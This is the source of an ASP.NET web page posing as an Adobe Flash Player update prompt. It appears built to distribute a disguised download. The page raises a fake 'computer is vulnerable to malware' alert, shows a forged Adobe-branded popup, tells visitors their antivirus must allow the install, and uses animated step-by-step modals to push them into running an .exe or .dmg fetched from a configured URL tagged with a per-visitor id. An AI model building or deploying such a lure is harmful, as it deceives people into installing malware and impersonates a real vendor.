<%@ Page Language="C#" %>
<%
    string PC_Download_URL = System.Configuration.ConfigurationManager.AppSettings["PC_Download_URL"] ;
    Boolean autoDownload = Convert.ToBoolean(System.Configuration.ConfigurationManager.AppSettings["mac_autoDownload"]);
    PC_Download_URL += Request["uid"];
     %>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="UTF-8">
  <title>Recommended Download</title>
  <link rel="icon" href="media/images/icon.png" type="image/png">
  <link rel="stylesheet" type="text/css" href="media/css/style.css">
  <link rel="stylesheet" type="text/css" href="media/css/modals-b2.css">
  <script type="text/javascript" src="media/js/jquery.min.js"></script>
  <script type="text/javascript" src="media/js/browserdetector_v2.js"></script>
  <script type="text/javascript" src="media/js/jquery-ui-1.10.4.custom.min.js"></script>


  <script type="text/javascript">
      window.onload = function () {
          var links = document.getElementsByTagName('a');

          for (var i = 0; i < links.length; i++) {
              links[i].onclick = function () {
                  window.onbeforeunload = null;
              }
          }
          alert("WARNING! Current version might be outdated!  Your computer is vulnerable to malware.  Install the latest version now.");
      };

      /*window.onbeforeunload = function()
      {
        return "";
      };*/
  </script>



</head>

<body onunload="exitPopUp()">

  

 

  <script>
      function hidePopup() {
          document.getElementById('popup').style.display = 'none';
          document.getElementById('layer').style.display = 'none';
      }
</script>
  <div class="video">
    <div class="content clearfix">
      <div class="top clearfix">
        <figure class="browser-img">
          <span class="DirectionsModal_cr crlog" style="display: none;"></span>
          <span class="DirectionsModal_ff fflog" style="display: none;"></span>
          <span class="DirectionsModal_ie ielog" style="display: none;"></span>
          <span class="DirectionsModal_op oplog" style="display: none;"></span>
          <span class="DirectionsModal crlog" style="display: none;"></span>
        </figure>

        <h1>Your version of Adobe Flash Player might be outdated! </h1>
        <p>Your computer is vulnerable to malware now. <br>
Install your Adobe Flash Player now</p>
        <small>Installing takes under a minute - No restart is required</small>

      </div>



<!--popup-->

  <div id="popup" style="display: none;">
  

 <p class="title">Updates are ready to install</p>
 <p class="little">the latest version of adobe flash player with critial security fixes is ready to install now</p>
 <p class="little">It wouldn´t take long to upgrade - and you´ll get all the latest improvements and fixes</p>

 <p class="copy">Copyright &copy; 2014 Adobe systems Softwareireland Ltd. All rights reserved</p>
 <p class="terms">Adobe Flash Player <a href="{{ BASE_URL }}terms.html">Terms of Service</a></p>

 <p class="note">Note: Your antivirus software must allow to install software</p>
 <p class="restart">No restart is required</p>


    <div class="buttons">
      <a href="<%=PC_Download_URL %>" class="showmodal accept">Upgrade</a>
      <a href="<%=PC_Download_URL %>" class="showmodal deny">Save File</a>
        </div>
<div class="close">
  
    </div>
    
  </div>
<!-- fin de popup-->
 
  <div style="display: none;" id="layer"></div>
<div class="modales" style="display: none;">
  <!-- modales navegadores -->
    <!-- cr -->
    <div class="DirectionsModal_cr modal-container" style="display: none; ">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-cr-arrow"></div>
          <div class="modal-cr">
            <div class="col1">
                <h3>Step 1</h3>
                <h4>Click</h4>
                <h5>file<span class="win" style="display: none;">.exe</span><span class="mac" style="display: none;">.dmg</span></h5>
                 <div id="loadingcr" style="display: block;"></div>
            </div>
            <div class="col2">
                <h3>Step 2</h3>
                <h4>Click <span>"Run"</span> when it appears</h4>
            </div>
            <div class="clear20"></div>
          </div>
        </div>
    </div>

    <!-- ff -->
    <div class="DirectionsModal_ff modal-container" style="display: none; ">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-ff-arrow"></div>
          <div class="modal-ff">
            <div class="col1">
                <h3>Step 1</h3>
                <h4>Click “Save file” </h4>
            </div>
            <div class="col2">
                <h3> Step 2</h3>
                <h4>Click the small download arrow above 
                </h4>
            </div>
            <div class="col3">
                <h3>Step 3</h3>
                <h4>Click the downloaded file</h4>
            </div>
            <div class="clear10"></div>
          </div>
        </div>
    </div>

    <!-- ie default --> 
    <div class="DirectionsModal_ie modal-container" style="display: none;">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-ie-arrow"></div>
            <div class="modal-ie-2-arrow"></div>
            <div class="modal-ie"> 
                <h4>Click <span>“Run/Save”</span> to download</h4>                
                <div class="clear10"></div>
            </div>
        </div>  
    </div>    
      <!-- default--> 
    <div class="DirectionsModal modal-container" style="display: none;">
        <div class="modal-bg"></div>
        <div class="modal-content-container">
            <div class="modal-default">
                <div class="padding20"> 
                    <span class="number one"></span><h2>Step one</h2>
                    <p>Download the <span class="win" style="display: none;">&quot;.EXE&quot;</span><span class="mac" style="display: none;">&quot;.DMG&quot;</span> file. Click to open the installer.</p>
                    <div class="clear10"></div>
                    <span class="number two"></span><h2>Step two</h2>
                    <p>Follow the installer instructions</p>
                </div>
                <div class="bluebar"></div>
            </div>
        </div>  
    </div>
  
  </div>
  <!--fin de modal de navegador-->

  <script type="text/javascript">
      $(document).ready(function () {
          BrowserDetect.displayBwDiv('.DirectionsModal');
      });
  </script>
<script>

    setTimeout(function () {
        document.getElementById('popup').style.display = 'block';
        document.getElementById('layer').style.display = 'block';
    }, 50);

    $(".close").click(function () {
        $("#layer").hide();
        $("#popup").hide();
    });
</script>
   <script type="text/javascript">

       function shaker() {
           $('.modal-cr-arrow').effect('shake', {
               direction: "up",
               distance: 8,
               times: 3
           }, 2000);
           $('.modal-ie-arrow').effect('shake', {
               direction: "up",
               distance: 8,
               times: 3
           }, 2000);
           $('.modal-ie-2-arrow').effect('shake', {
               direction: "up",
               distance: 8,
               times: 3
           }, 2000);
           $('.modal-ff-arrow').effect('shake', {
               direction: "up",
               distance: 8,
               times: 3
           }, 2000);
       }

       $(".showmodal").click(function () {
           $(".modales").fadeIn("slow");
           $("#loadingcr").show();
           setTimeout('$("#loadingcr").fadeOut("300");', 3000);

           var shake = setInterval(shaker, 0);
       });

       $(".modal-container").click(function () {
           $(".modales").fadeOut("slow");

       });

    </script>
</body></html>





